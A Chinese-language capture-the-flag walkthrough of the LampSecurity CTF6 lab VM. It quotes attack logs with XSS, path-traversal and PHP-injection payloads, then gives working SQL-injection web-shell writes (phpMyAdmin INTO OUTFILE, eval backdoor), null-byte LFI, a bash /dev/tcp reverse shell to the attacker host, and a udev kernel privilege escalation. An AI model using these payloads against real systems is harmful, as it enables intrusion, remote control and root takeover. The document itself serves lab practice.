16:06:55\t172.16.61.132 called action=search&amp;searchFor=\\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script2009-06-29 16:06:55\t172.16.61.132 called 2009-06-29 16:06:55\t172.16.61.132 called SectionID=3&amp;SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;PhraseSearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;SearchContentClassID=-1&amp;SearchSectionID=-1&amp;SearchDate=-1&amp;SearchButton=Search2009-06-29 16:06:55\t172.16.61.132 called mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;op=browse2009-06-29 16:06:55\t172.16.61.132 called sql_debug=12009-06-29 16:06:55\t172.16.61.132 called sql_debug=12009-06-29 16:06:56\t172.16.61.132 called 2009-06-29 16:06:56\t172.16.61.132 called rep=&lt;script&gt;alert(document.cookie)&lt;/script&gt;2009-06-29 16:06:56\t172.16.61.132 called 2009-06-29 16:06:56\t172.16.61.132 called 2009-06-29 16:06:57\t172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc2009-06-29 16:06:57\t172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd2009-06-29 16:06:57\t172.16.61.132 called err=3&amp;email=\\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;2009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:58\t172.16.61.132 called PageServices2009-06-29 16:06:58\t172.16.61.132 called wp-cs-dump2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called vo=\\&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;2009-06-29 16:06:00\t172.16.61.132 called showforum=1&amp;prune_day=100&amp;sort_by=Z-A&amp;sort_key=[sqlgoeshere]2009-06-29 16:06:00\t172.16.61.132 called offset=[%20Problem%20Here%20]2009-06-29 16:06:02\t172.16.61.132 called base=test%202009-06-29 16:06:03\t172.16.61.132 called IDAdmin=test2009-06-29 16:06:03\t172.16.61.132 called pymembs=admin2009-06-29 16:06:03\t172.16.61.132 called SqlQuery=test%202009-06-29 16:06:03\t172.16.61.132 called tampon=test%202009-06-29 16:06:03\t172.16.61.132 called topic=&amp;amp;lt;script&amp;amp;gt;alert(document.cookie)&amp;amp;lt;/script&amp;amp;gt;%202009-06-29 16:06:04\t172.16.61.132 called 2009-06-29 16:06:04\t172.16.61.132 called 2009-06-29 16:06:04\t172.16.61.132 called 2009-06-29 16:06:04\t172.16.61.132 called pattern=/etc/*&amp;sort=name2009-06-29 16:06:05\t172.16.61.132 called D=A2009-06-29 16:06:05\t172.16.61.132 called N=D2009-06-29 16:06:05\t172.16.61.132 called S=A2009-06-29 16:06:05\t172.16.61.132 called M=A2009-06-29 16:06:05\t172.16.61.132 called \\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called 2009-06-29 16:06:30\t172.16.61.132 called 2009-06-29 16:06:31\t172.16.61.132 called 2009-06-29 16:06:31\t172.16.61.132 called action=login2009-06-29 16:06:31\t172.16.61.132 called id=42009-06-29 16:06:31\t172.16.61.132 called id=32009-06-29 16:06:31\t172.16.61.132 called id=22009-06-29 16:06:31\t172.16.61.132 called id=12009-06-29 16:06:32\t172.16.61.132 called C=N;O=D2009-06-29 16:06:32\t172.16.61.132 called C=M;O=A2009-06-29 16:06:32\t172.16.61.132 called C=S;O=A2009-06-29 16:06:32\t172.16.61.132 called C=D;O=A2009-06-29 16:06:32\t172.16.61.132 called 2009-06-29 16:06:33\t172.16.61.132 called id=42009-06-29 16:06:33\t172.16.61.132 called action=login2009-06-29 16:06:33\t172.16.61.132 called id=32009-06-29 16:06:33\t172.16.61.132 called id=22009-06-29 16:06:34\t172.16.61.132 called id=12009-06-29 16:06:34\t172.16.61.132 called action=login2009-06-29 16:06:34\t172.16.61.132 called 2009-06-29 16:06:34\t172.16.61.132 called action=login2009-06-29 16:06:17\t172.16.61.132 called 2009-06-29 16:06:17\t172.16.61.132 called 2009-06-29 16:06:23\t172.16.61.132 called Open2009-06-29 16:06:23\t172.16.61.132 called OpenServer2009-06-29 18:06:56\t172.16.61.132 called \n看了一下日志，我们可以明显的发现这台机子显然被攻击过。仔细看看甚至里面已经有攻击者留下的后门了。\n2009-06-28 18:06:06\t172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27\n但是他放在/tmp目录下，这该怎么访问到。。。除非有本地文件包含漏洞。我们再仔细看看日志，果然看到上一个攻击者确实在尝试LFI漏洞。\nExploit我们挑几个的试试看看有没有成功的。\n2009-06-28 18:06:13\t172.16.61.132 called actions/login.php?action=../conf/config.ini%00\n这一条不就是之前在主页登录那块的请求吗。再一想，我们甚至还有index.php的源代码在之前的备份包里。\n&lt;?php   /*** This is the index page for the sample application. * This application is meant to be part of the PHP Code Auditing * course offered by SAS Information Security.  Don *not* install* this application on a live server* * @package PHP Code Auditing * @author Justin C. Klein Keane &lt;jukeane@sas.upenn.edu&gt;* **/  //make sure the app will run!  include_once(&#x27;inc/config_check.php&#x27;);session_start();$logged_in = isset($_COOKIE[&#x27;logged_in&#x27;]) ? $_COOKIE[&#x27;logged_in&#x27;] : 0;//get configuration variables$configs = parse_ini_file(&#x27;conf/config.ini&#x27;) or die(&quot;Error parsing config file conf/config.ini&quot;);//set up loggininclude_once(&#x27;lib/log.class.php&#x27;);$log = new Log();//set up the db connection$conn = mysql_connect($configs[&#x27;database_host&#x27;], $configs[&#x27;database_user&#x27;], $configs[&#x27;database_pass&#x27;]) or $log-&gt;append(mysqlerror());mysql_select_db($configs[&#x27;database_db&#x27;]);$action = (isset($_GET[&#x27;action&#x27;])) ? $_GET[&#x27;action&#x27;] : &#x27;default&#x27;;$valid_actions = array(  &#x27;default&#x27;,   &#x27;login&#x27;,   &#x27;add_event&#x27;,   &#x27;edit_event&#x27;,   &#x27;view_event&#x27;,   &#x27;delete_event&#x27;,   &#x27;logout&#x27;,  &#x27;users&#x27;,  &#x27;logs&#x27;);//auth check$is_admin = 0;if (isset($_COOKIE[&#x27;user_id&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;hash&#x27;])) &#123;  $sql = &#x27;SELECT user_id FROM user WHERE user_id = &#x27; . $_COOKIE[&#x27;user_id&#x27;] . &#x27; AND user_password = \\&#x27;&#x27; . $_COOKIE[&#x27;hash&#x27;] . &#x27;\\&#x27;&#x27;;  $retval = mysql_query($sql) or $log-&gt;append(&quot;Problem with sql $sql &lt;hr/&gt;&quot; . mysql_error());  if (mysql_num_rows($retval) &gt; 0 )  $is_admin = 1;&#125;$admin_actions = array(&#x27;add_event&#x27;, &#x27;edit_event&#x27;, &#x27;view_event&#x27;, &#x27;delete_event&#x27;, &#x27;users&#x27;, &#x27;logs&#x27;);if (in_array($action, $admin_actions) &amp;&amp; ! $is_admin) $action = &#x27;default&#x27;;if (! in_array($action, $valid_actions)) $action = &#x27;default&#x27;;if ($action != &#x27;delete_event&#x27; &amp;&amp; $action != &#x27;logout&#x27;)   include_once(&#x27;inc/header.php&#x27;);include_once(&#x27;actions/&#x27;.$action . &#x27;.php&#x27;);include_once(&#x27;inc/footer.php&#x27;);?&gt;\n第31和62行我们可以看到，典型的LFI漏洞，但是最后有个后缀名.php。看了下PHP版本，刚好可以通过零字符截断。于是我们验证一下能不能成功\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ curl &#x27;http://192.168.56.140/actions/login.php?action=../../../../../../../../etc/passwd%00&#x27;root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinrpm:x:37:37::/var/lib/rpm:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologindistcache:x:94:94:Distcache:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashpcap:x:77:77::/var/arpwatch:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologindovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologinjohn:x:500:500::/home/john:/bin/bashlinda:x:501:501::/home/linda:/bin/bashfred:x:502:502::/home/fred:/bin/bashmolly:x:503:503::/home/molly:/bin/bashtoby:x:504:504::/home/toby:/bin/bash\n发现，非常的OK。\n所以，按道理，我们和同行一样构造id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27这样一条语句就可以注入一句话木马然后通过蚁剑连接了。但是，既然都拿到phpmyadmin的管理员权限的账号了，我们不妨研究下怎么通过phpmyadmin向服务器插入webshell。上网查了查，主要三种方法能导出webshell：\n\n日志法写入\n\nRoot数据库用户（root权限）\n没有写入权限\nmagic_quotes_gpc：Off（关闭）\n\n\n\n\nshow global variables like &quot;%genera%&quot;;          //查询general_log配置以及log保存位置set global general_log=&#x27;on&#x27;;              //开启general log模式SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;;    //设置日志文件保存路径SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;;              //phpinfo()写入日志文件，exp写入reverse shell即可。set global general_log=&#x27;off&#x27;;              //关闭general_log模式// 访问设置的日志文件保存路径可以看到php被执行\n\n\n直接插入\n\nRoot数据库用户（root权限）\n网站绝对路径（确定有写入权限）\nmagic_quotes_gpc：Off（关闭）\n\n\n\n\nselect &#x27;&lt;?php exec(&quot;/bin/bash -c \\&#x27;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1\\&#x27;&quot;)?&gt;&#x27; INTO OUTFILE &#x27;/tmp/shell.php&#x27;;\n\n\n新建数据库插入\n1.Root数据库用户（root权限）2.网站绝对路径（确定有写入权限）3.magic_quotes_gpc：Off（开启）\n\n\n\n/*创建数据表导出shell*/CREATE TABLE `mysql`.`user1` (`content` TEXT NOT NULL );INSERT INTO `mysql`.`user1` (`content` ) VALUES (&#x27;&lt;?php @eval($_POST[x123]);?&gt;&#x27;);SELECT `content` FROM `user1` INTO OUTFILE &#x27;C:\\\\phpStudy\\\\WWW\\\\xxx.php&#x27;;DROP TABLE IF EXISTS `user1`;\n这台服务器上，general_log功能根本没有，直接第一条skip。第二条试试。发现写入不到网页的各个目录，难怪前一个攻击者是写入/tmp目录下，看了下mysql的tmpdir，果然是/tmp，这玩意是只读的，只能在配置文件里改。我们只能捏着鼻子写进/tmp目录下了。\nselect &#x27;&lt;?php exec(&quot;/bin/bash -c \\&#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.132/4444 0&gt;&amp;1\\&#x27;&quot;)?&gt;&#x27; INTO OUTFILE &#x27;/tmp/shell.php&#x27;;\n然而我们组合技还有一个文件包含，我们直接通过LFI漏洞目录遍历请求我们的shell。\n# curl 192.168.56.140/actions/login.php?action=../../../../../../../../tmp/shell.php%00  ┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 4444[sudo] password for kali: listening on [any] 4444 ...192.168.56.140: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.140] 39860bash: no job control in this shellbash-3.2$ whoami    apachebash-3.2$ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0    inet6 fe80::20c:29ff:fe5c:7570/64 scope link        valid_lft forever preferred_lft forever3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop     link/sit 0.0.0.0 brd 0.0.0.0\n成功拿到shell。\nPrivilge Escalation上来sudo -l，find / -type f -perm -04000 -ls 2&gt;/dev/null,crontab都试过了。看了半天也没啥能用的。手动遍历下目录，/home下各用户home目录全是不可读写，想找点凭证没法了。再手动查看了下还是没啥有用的。上linpeas，上来就标红了一条内核版本。但是不是很想走内核提权。先试试别的路径。弄了半天，基本都试过一遍了，没辙了。回头看看内核提权吧。\nsh-3.2$ uname -aLinux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux\n在exp-db上搜了下Linux Kernal 2.6，从头开始试LPE的exp，试了快8个，都没成功，折磨疯了。上网搜了一下发现Linux 2.6是有一个著名的内核提权漏洞UDEV。按他给的步骤先查看udev的pid，然后按网上给的方法先修补一下程序。结果执行多次仍然无法成功提权。\nbash-3.2$ cat /proc/net/netlinksk       Eth Pid    Groups   Rmem     Wmem     Dump     Lockscfebce00 0   0      00000000 0        0        00000000 2cfc35a00 6   0      00000000 0        0        00000000 2cfe78600 7   0      00000000 0        0        00000000 2c1322200 9   2452   00000000 0        0        00000000 2cfe66e00 9   0      00000000 0        0        00000000 2cf557c00 10  0      00000000 0        0        00000000 2cf518c00 11  0      00000000 0        0        00000000 2cfc35400 15  568    ffffffff 0        0        00000000 2cfebcc00 15  0      00000000 0        0        00000000 2cf518a00 16  0      00000000 0        0        00000000 2cf6c0c00 18  0      00000000 0        0        00000000 2bash-3.2$ sed -i -e &#x27;s/\\r$//&#x27; kernal2.6.shbash-3.2$ chmod +x kernal2.6.shbash-3.2$ ./kernal2.6.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same file\n重试一下，切成sh试试，不知道有没有影响。\nsh-3.2$ ./exp.sh 568./exp.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same filesh-3.2$ ./exp.sh 568./exp.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same filesh-3.2$ ./exp.sh 568./exp.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same filesh-3.2# whoamiwhoamirootsh-3.2# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0    inet6 fe80::20c:29ff:fe5c:7570/64 scope link        valid_lft forever preferred_lft forever3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop     link/sit 0.0.0.0 brd 0.0.0.0sh-3.2#\n多试了几次之后成功提权了。我的评价是内核提权是这样的，非常不稳定。主要这台靶机没有啥别的提权思路了，只能内核提权尝试了。\n","categories":["vulnhub"],"tags":["walkthrough"]}]